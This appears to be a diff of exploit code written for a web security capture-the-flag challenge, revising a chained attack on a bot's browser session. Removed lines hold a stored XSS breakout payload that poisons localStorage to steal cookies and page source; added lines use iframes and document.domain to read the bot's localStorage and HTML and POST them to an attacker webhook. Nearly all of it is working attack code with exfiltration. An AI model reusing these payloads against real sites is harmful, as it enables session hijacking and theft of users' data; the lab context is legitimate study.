@@ -41,32 +41,30 @@
             }, 50);
 
             function executePayload(token) {
+                // The Master Exfiltration Payload
                 var innerJS = 
                     "document.domain='owley-madison.jeopardy.websec.saarland';" +
                     "new Image().src='" + W + "/?step=4_diary_xss';" +
                     
-                    // 1. Open the Match page to poison storage
                     "var m=document.createElement('iframe');" +
                     "m.src='https://match.owley-madison.jeopardy.websec.saarland/';" +
                     "m.onload=function(){" +
                         "new Image().src='" + W + "/?step=5_match_iframe_ready';" +
-                        
-                        // THE VACUUM TRAP: Grabs Cookies and DOM Source
-                        "var trap = \"new Image().src='" + W + "/?step=7_chat_xss_fired'; " +
-                                   "var x=new XMLHttpRequest(); " +
-                                   "x.open('POST', '" + W + "'); " +
-                                   "x.send('COOKIES: ' + document.cookie + '\\n\\nDOM: ' + document.documentElement.innerHTML);\";" +
-                                   
-                        // THE BREAKOUT: Notice the </select> tag!
-                        "var p = '</option></select><img src=x onerror=\"' + trap + '\">';" +
-                        "m.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));" +
-                        
-                        "new Image().src='" + W + "/?step=6_poisoned_loading_chat_in_iframe';" +
-                        
-                        // 2. Open the Chat page in a SECOND iframe to trigger the trap silently
-                        "var c=document.createElement('iframe');" +
-                        "c.src='https://chat.owley-madison.jeopardy.websec.saarland/';" +
-                        "document.body.appendChild(c);" +
+                        "try {" +
+                            // 1. Read the bot's LocalStorage (The Flag)
+                            "var favs = m.contentWindow.localStorage.getItem('favorites');" +
+                            
+                            // 2. Read the bot's HTML Session (Just in case)
+                            "var html = m.contentDocument.documentElement.innerHTML;" +
+                            
+                            // 3. POST it all to the Webhook
+                            "var x=new XMLHttpRequest();" +
+                            "x.open('POST', '" + W + "');" +
+                            "x.send('LOCAL_STORAGE: ' + favs + '\\n\\nHTML: ' + html);" +
+                            "new Image().src='" + W + "/?step=6_exfiltration_sent';" +
+                        "} catch(e) {" +
+                            "new Image().src='" + W + "/?error=' + encodeURIComponent(e.message);" +
+                        "}" +
                     "};" +
                     "document.body.appendChild(m);";
 
